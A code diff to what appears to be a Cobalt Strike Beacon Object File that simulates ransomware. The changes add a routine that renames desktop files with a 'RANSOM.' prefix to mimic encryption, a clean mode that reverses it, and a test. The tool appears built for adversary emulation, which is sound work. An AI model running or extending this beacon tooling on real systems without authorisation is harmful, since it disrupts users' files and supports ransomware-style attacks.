@@ -87,6 +87,21 @@ extern "C" {
 	DFR(MSVCRT, sprintf);
 #define sprintf MSVCRT$sprintf
 
+	DFR(KERNEL32, FindFirstFileW);
+#define FindFirstFileW KERNEL32$FindFirstFileW
+
+	DFR(KERNEL32, FindNextFileW);
+#define FindNextFileW KERNEL32$FindNextFileW
+
+	DFR(KERNEL32, GetFileAttributesW);
+#define GetFileAttributesW KERNEL32$GetFileAttributesW
+
+	DFR(KERNEL32, MoveFileW);
+#define MoveFileW KERNEL32$MoveFileW
+
+	DFR(KERNEL32, FindClose);
+#define FindClose KERNEL32$FindClose
+
 	int go(char* args, int len);
 }
 
@@ -101,7 +116,6 @@ BOOL IsUserDesktop(PWSTR desktopFolder) {
 		BeaconPrintf(CALLBACK_ERROR, "[!] The path %ls is not a user folder.\n", desktopFolder);
 		return FALSE;
 	}
-
 	return TRUE;
 }
 
@@ -183,20 +197,20 @@ BOOL WriteFileToDisk(wchar_t* fileName, char* fileBytes, int fileLen) {
 /// <param name="outBuffer"></param>
 /// <param name="outBufferLen"></param>
 /// <returns></returns>
-BOOL CreateFilePath(PWSTR deskopPath, PWSTR fileName, PWSTR outBuffer, SIZE_T outBufferLen) {
+BOOL CreateFilePath(PWSTR deskopPath, PWSTR fileName, PWSTR outBuffer, SIZE_T outBufferLen, PWSTR format = L"%ls\\%ls") {
 	// Wipe buffer
 	memset(outBuffer, 0, outBufferLen * sizeof(WCHAR));
 
 	//Veirfy buffer is large and then assemble path
 	if (wcslen(deskopPath) + wcslen(L"\\") + wcslen(fileName) + 1 < outBufferLen) {
-		_swprintf(outBuffer, L"%ls\\%ls", deskopPath, fileName);
-		BeaconPrintf(CALLBACK_OUTPUT, "[+] Assembled file path: %ls\n", outBuffer);
-		return TRUE;
+		_swprintf(outBuffer, format, deskopPath, fileName);
 	}
 	else {
 		BeaconPrintf(CALLBACK_OUTPUT, "[!] Assembled file path: %ls\n", outBuffer);
 		return FALSE;
 	}
+
+	return TRUE;
 }
 
 /// <summary>
@@ -269,6 +283,93 @@ BOOL ReadOriginalImagePath(PWSTR ransomNotePath, PWSTR outBuffer, SIZE_T outBuff
 	// Ensure the file exists
 	if (!PathFileExistsW(outBuffer)) {
 		BeaconPrintf(CALLBACK_ERROR, "[!] ReadOriginalImagePath: The original wallpaper path does not exist: %ls\n", outBuffer);
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+/// <summary>
+/// Method to rename files on the desktop Path
+/// </summary>
+/// <param name="desktopPath"></param>
+/// <param name="ransomMode"></param>
+/// <returns></returns>
+BOOL RenameFiles(PWSTR desktopPath, BOOL ransom) {
+	// Assemble the search path for use with FindFirsFileW
+	WCHAR searchPath[MAX_PATH];
+	if (!CreateFilePath(desktopPath, L"*", searchPath, MAX_PATH)) {
+		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to assemble search path %d.\n", GetLastError());
+		return FALSE;
+	}
+
+	WIN32_FIND_DATAW fileFounded;
+	HANDLE hSearch = FindFirstFileW(searchPath, &fileFounded);
+	if (hSearch == INVALID_HANDLE_VALUE) {
+		BeaconPrintf(CALLBACK_ERROR, "[!] FindFirstFileW failed! GLE: %d\n", GetLastError());
+		return FALSE;
+	}
+
+	// Iterate through files in the desktop directory
+	WCHAR currPath[MAX_PATH];
+	WCHAR newPath[MAX_PATH];
+	int numFilesAltered = 0;
+	do {
+		// Assemble full path of file
+		if (!CreateFilePath(desktopPath, fileFounded.cFileName, currPath, MAX_PATH))
+			continue;
+
+		// Excluede files that are not regular files
+		if (StrStrIW(currPath, L".ransomnote.txt") || StrStrIW(currPath, L"RANSOM.txt") || StrStrIW(currPath, L"desktop.ini"))
+			continue;
+
+		// Make sure it's a file and not a directory
+		DWORD dwAttrib = GetFileAttributesW(currPath);
+		if (dwAttrib == INVALID_FILE_ATTRIBUTES || dwAttrib & FILE_ATTRIBUTE_DIRECTORY)
+			continue;
+
+		// If ransom mode is enabled, rename to add 'RANSOM.' to the beginning of the file name
+		if (ransom) {
+
+			// Assemble new path
+			if (!CreateFilePath(desktopPath, fileFounded.cFileName, newPath, MAX_PATH, L"%ls\\RANSOM.%ls"))
+				continue;
+
+			// Rename the file
+			if (MoveFileW(currPath, newPath))
+				numFilesAltered++;
+		}
+		else {
+			wchar_t* originalName = StrStrIW(fileFounded.cFileName, L"RANSOM.");
+			if (originalName) {
+				// Increment pinter by lenght of keyword to get original file name
+				originalName += wcslen(L"RANSOM.");
+
+				// Assemble new path
+				if (!CreateFilePath(desktopPath, originalName, newPath, MAX_PATH))
+					continue;
+
+				// Rename the file
+				if(MoveFileW(currPath, newPath))
+					numFilesAltered++;
+			}
+		}
+
+	} while (FindNextFileW(hSearch, &fileFounded));
+
+
+	// Store the last error before close the search handle
+	DWORD dwLastError = GetLastError();
+
+	// Close the search handle
+	FindClose(hSearch);
+
+	// Return the number of files altered
+	BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully altered %d files.\n", numFilesAltered);
+
+	// Evalute the last error from FindNextFileW
+	if (dwLastError != ERROR_NO_MORE_FILES) {
+		BeaconPrintf(CALLBACK_ERROR, "[!] RenameFiles: FindNextFileW failed! GLE: %d\n", dwLastError);
 		return FALSE;
 	}
 
@@ -355,6 +456,11 @@ int Ransom(WCHAR desktopPath[], char* newWallpaperBytes, int newWallpaperLen, ch
 		return -1;
 	}
 
+	// Rename files on the desktop to simulate encryption
+	if(RenameFiles(desktopPath, TRUE))
+		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully renamed files on the desktop.\n");
+	else
+		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to rename files on the desktop.\n");
 
 	return 0;
 }
@@ -389,6 +495,12 @@ int Clean(WCHAR desktopPath[]) {
 		BeaconPrintf(CALLBACK_ERROR, "[!] Clean: Failed to restore the original wallpaper: %d\n", GetLastError());
 		return -1;
 	}
+
+	// Rename files to original names
+	if (RenameFiles(desktopPath, FALSE))
+		BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully renamed files.\n");
+	else
+		BeaconPrintf(CALLBACK_ERROR, "[!] Failed to rename files.\n");
 
 	//Delete the ransom wallpaper
 	if (!DeleteFileW(ransomWallpaper))
@@ -692,7 +804,7 @@ TEST(Ransomware, goTest) {
 
 	// Run clean mode
 	results = bof::runMocked<const wchar_t*>(go, L"clean");
-	
+
 	// Expect success if run as normal user otherwise expect fail
 	if (IsNormalUser())
 		EXPECT_EQ(0, results.returnVal);
